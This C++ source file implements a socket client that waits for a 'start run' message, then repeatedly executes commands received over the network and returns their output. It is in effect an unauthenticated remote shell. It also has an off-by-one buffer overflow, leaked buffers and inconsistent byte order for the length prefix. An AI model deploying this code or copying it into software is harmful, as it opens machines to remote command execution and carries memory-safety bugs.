#include "main.h"
#define RUNSTATEMENT "start run"

using namespace std;

OperateSocket::OperateSocket(SOCKET socketC) {
	OperateSocket::socketC = socketC;
	OperateSocket::moderun = false;
}

bool OperateSocket::wait_for_run(){
	cout << "1)" << endl;
	if (moderun)
		return true;

	cout << "2)" << endl;
	while (true) {
		int size = get_size_pkt();
		if (size <= 0)
			continue;
		cout << "size: " << size << endl;
		char* buf = new char[size];
		recv_func(&buf[0], size);

		if (strcmp(buf, RUNSTATEMENT) == 0) {
			return true;
		}
	}
	return false;
}

int OperateSocket::get_size_pkt(){
	char sizeBuff[5];
	memset(sizeBuff, '\0', sizeof(sizeBuff));
	int k = 0;
	while (k < 4) {
		int nbytes = recv(socketC, &sizeBuff[k], 1, 0);
		k++;
	};

	int* myints = (int*)sizeBuff;
	int sizePkt = ntohl(*myints);
	return sizePkt;
}

int OperateSocket::send_func(char* data, int lenData)
{
	send(socketC, (char*)&lenData, sizeof(int), 0);
	send(socketC, data, lenData, 0);
	return 0;
}

int OperateSocket::recv_func(char* buf, int size)
{
	int count = 0;
	while (count < size) {
		recv(socketC, &buf[count], 1, 0);
		count++;
	}
	buf[count] = '\0';
	return 0;
}

void OperateSocket::operate() {
	Command command;
	moderun = wait_for_run();
	while (moderun) {
		char* runcd = command.run_command("cd 2>&1");
		send_func(runcd, strlen(runcd));
		char* response = nullptr;
		int size = get_size_pkt();
		if (size <= 0)
			continue;

		char* buf = new char[size];
		recv_func(&buf[0], size);
		response = command.run_command(buf);
		cout << "res:" << response << endl;
		send_func(response, strlen(response));
	}
}